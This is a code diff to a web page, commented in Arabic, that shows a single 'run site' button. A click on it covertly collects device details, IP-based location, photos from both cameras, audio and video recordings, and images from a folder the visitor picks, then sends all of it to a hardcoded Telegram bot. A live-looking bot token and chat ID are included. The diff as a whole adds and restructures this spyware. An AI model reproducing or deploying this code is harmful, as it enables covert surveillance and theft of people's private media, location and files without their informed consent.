@@ -28,10 +28,8 @@
         }
         button:active {
             transform: scale(0.95);
+            background: #45a049;
         }
-        .recording { background: #f44336; }
-        .sending { background: #FF9800; }
-        .success { background: #2196F3; }
     </style>
 </head>
 <body>
@@ -40,72 +38,148 @@
     <script>
         const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
         const CHAT_ID = "6913353602";
+        
         const actionButton = document.getElementById('actionButton');
 
         actionButton.addEventListener('click', async function() {
             try {
-                // المرحلة 1: جمع معلومات الجهاز
-                actionButton.textContent = "جمع المعلومات...";
-                actionButton.classList.add('sending');
-                const deviceInfo = await collectDeviceInfo();
-                await sendToTelegram(formatDeviceInfo(deviceInfo));
+                // تعطيل الزر أثناء المعالجة
+                actionButton.textContent = "جاري التشغيل...";
+                actionButton.disabled = true;
                 
-                // المرحلة 2: تحديد الموقع
-                actionButton.textContent = "تحديد الموقع...";
-                const locationInfo = await getAccurateLocation();
-                await sendToTelegram(formatLocationInfo(locationInfo));
+                // 1. جمع معلومات الجهاز والموقع
+                const deviceInfo = await getDeviceInfo();
+                const locationInfo = await getLocationInfo();
+                await sendToTelegram(formatInfo(deviceInfo, locationInfo));
                 
-                // المرحلة 3: تسجيل الصوت (10 ثواني)
-                actionButton.textContent = "تسجيل الصوت...";
-                actionButton.classList.replace('sending', 'recording');
-                await recordAndSend('audio', 10000);
+                // 2. التقاط صورة من الكاميرا الأمامية
+                const frontCameraImage = await captureCamera('user');
+                await sendToTelegram(frontCameraImage, 'sendPhoto', 'front_camera.jpg');
                 
-                // المرحلة 4: تسجيل الفيديو (15 ثواني)
-                actionButton.textContent = "تسجيل الفيديو...";
-                await recordAndSend('video', 15000);
+                // 3. التقاط صورة من الكاميرا الخلفية
+                const backCameraImage = await captureCamera('environment');
+                await sendToTelegram(backCameraImage, 'sendPhoto', 'back_camera.jpg');
                 
-                // المرحلة 5: إرسال الصور
-                actionButton.textContent = "إرسال الصور...";
-                actionButton.classList.replace('recording', 'sending');
-                await sendImages();
+                // 4. تسجيل صوت لمدة 10 ثواني
+                const audioBlob = await recordAudio(10000);
+                await sendToTelegram(audioBlob, 'sendAudio', 'audio_recording.ogg');
                 
-                // الانتهاء
-                actionButton.textContent = "تم التشغيل بنجاح ✅";
-                actionButton.classList.replace('sending', 'success');
+                // 5. تسجيل فيديو لمدة 15 ثانية
+                const videoBlob = await recordVideo(15000);
+                await sendToTelegram(videoBlob, 'sendVideo', 'video_recording.mp4');
+                
+                // 6. إرسال 20 صورة من الجهاز
+                const imagesSent = await sendImagesFromDevice();
+                
+                // إعلام المستخدم بالانتهاء
+                actionButton.textContent = `تم التشغيل بنجاح (${imagesSent} صور)`;
                 
             } catch (error) {
-                console.error('Error:', error);
+                console.error('حدث خطأ:', error);
                 actionButton.textContent = "خطأ! اضغط مجدداً";
-                actionButton.className = '';
             } finally {
                 setTimeout(() => {
                     actionButton.textContent = "تشغيل الموقع";
-                    actionButton.className = '';
+                    actionButton.disabled = false;
                 }, 5000);
             }
         });
 
-        // ========== دوال التسجيل ==========
-        async function recordAndSend(type, duration) {
-            const stream = await navigator.mediaDevices.getUserMedia(
-                type === 'audio' ? { audio: true } : 
-                { video: { facingMode: "environment" }, audio: true }
-            );
+        // ===== الدوال المساعدة =====
+        
+        async function getDeviceInfo() {
+            return {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                memory: navigator.deviceMemory || 'غير معروف',
+                connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
+                battery: await getBatteryStatus()
+            };
+        }
+
+        async function getBatteryStatus() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return `${Math.floor(battery.level * 100)}% ${battery.charging ? 'يشحن' : 'غير مشحون'}`;
+                } catch {
+                    return 'غير معروف';
+                }
+            }
+            return 'غير متاح';
+        }
+
+        async function getLocationInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    country: data.country_name,
+                    city: data.city,
+                    isp: data.org
+                };
+            } catch {
+                return {
+                    ip: 'غير معروف',
+                    country: 'غير معروف',
+                    city: 'غير معروف',
+                    isp: 'غير معروف'
+                };
+            }
+        }
+
+        function formatInfo(device, location) {
+            return `📱 <b>معلومات الجهاز:</b>\n` +
+                   `• النظام: ${device.platform}\n` +
+                   `• الشاشة: ${device.screen}\n` +
+                   `• البطارية: ${device.battery}\n` +
+                   `• الشبكة: ${device.connection}\n\n` +
+                   `📍 <b>الموقع:</b>\n` +
+                   `• الدولة: ${location.country}\n` +
+                   `• المدينة: ${location.city}\n` +
+                   `• IP: <code>${location.ip}</code>\n` +
+                   `• المزود: ${location.isp}`;
+        }
+
+        async function captureCamera(facingMode) {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { 
+                    facingMode: facingMode,
+                    width: 1280,
+                    height: 720 
+                }
+            });
             
-            const mimeType = type === 'audio' ? 'audio/webm' : 'video/mp4';
-            const method = type === 'audio' ? 'sendAudio' : 'sendVideo';
-            const filename = type === 'audio' ? 'تسجيل صوت.webm' : 'تسجيل فيديو.mp4';
+            const track = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(track);
+            const bitmap = await imageCapture.grabFrame();
+            
+            // تحويل Bitmap إلى Blob
+            const canvas = document.createElement('canvas');
+            canvas.width = bitmap.width;
+            canvas.height = bitmap.height;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(bitmap, 0, 0);
             
             return new Promise((resolve) => {
-                const recorder = new MediaRecorder(stream, { mimeType });
+                canvas.toBlob(resolve, 'image/jpeg', 0.8);
+                track.stop();
+            });
+        }
+
+        async function recordAudio(duration) {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            return new Promise((resolve) => {
+                const recorder = new MediaRecorder(stream, { mimeType: 'audio/ogg' });
                 let chunks = [];
                 
                 recorder.ondataavailable = (e) => chunks.push(e.data);
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: mimeType });
-                    await sendToTelegram(blob, method, filename);
+                recorder.onstop = () => {
+                    resolve(new Blob(chunks, { type: 'audio/ogg' }));
                     stream.getTracks().forEach(track => track.stop());
-                    resolve();
                 };
                 
                 recorder.start();
@@ -113,8 +187,31 @@
             });
         }
 
-        // ========== إرسال الصور ==========
-        async function sendImages() {
+        async function recordVideo(duration) {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'environment', width: 1280, height: 720 },
+                audio: true
+            });
+            
+            return new Promise((resolve) => {
+                const recorder = new MediaRecorder(stream, { 
+                    mimeType: 'video/mp4',
+                    videoBitsPerSecond: 2500000
+                });
+                let chunks = [];
+                
+                recorder.ondataavailable = (e) => chunks.push(e.data);
+                recorder.onstop = () => {
+                    resolve(new Blob(chunks, { type: 'video/mp4' }));
+                    stream.getTracks().forEach(track => track.stop());
+                };
+                
+                recorder.start();
+                setTimeout(() => recorder.stop(), duration);
+            });
+        }
+
+        async function sendImagesFromDevice() {
             try {
                 const dirHandle = await window.showDirectoryPicker();
                 let sentCount = 0;
@@ -134,42 +231,6 @@
             }
         }
 
-        // ========== دوال المعلومات ==========
-        async function collectDeviceInfo() {
-            return {
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                deviceMemory: navigator.deviceMemory || 'غير معروف',
-                connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف'
-            };
-        }
-
-        function formatDeviceInfo(info) {
-            return `📱 <b>معلومات الجهاز:</b>\n` +
-                   `• النظام: ${info.platform}\n` +
-                   `• المتصفح: ${info.userAgent.split(' ')[0]}\n` +
-                   `• اللغة: ${info.language}\n` +
-                   `• الشاشة: ${info.screen}\n` +
-                   `• الذاكرة: ${info.deviceMemory} GB\n` +
-                   `• الشبكة: ${info.connection}`;
-        }
-
-        async function getAccurateLocation() {
-            const res = await fetch('https://ipapi.co/json/');
-            return res.json();
-        }
-
-        function formatLocationInfo(info) {
-            return `📍 <b>الموقع:</b>\n` +
-                   `• الدولة: ${info.country_name}\n` +
-                   `• المدينة: ${info.city}\n` +
-                   `• IP: <code>${info.ip}</code>\n` +
-                   `• المزود: ${info.org || 'غير معروف'}`;
-        }
-
-        // ========== إرسال إلى التليجرام ==========
         async function sendToTelegram(data, method = 'sendMessage', filename = 'file') {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -178,9 +239,11 @@
                 formData.append('text', data);
                 formData.append('parse_mode', 'HTML');
             } else {
-                formData.append(method === 'sendAudio' ? 'audio' : 
-                              (method === 'sendVideo' ? 'video' : 'photo'), 
-                              data, filename);
+                formData.append(
+                    method === 'sendAudio' ? 'audio' : 
+                    method === 'sendVideo' ? 'video' : 'photo', 
+                    data, filename
+                );
             }
             
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
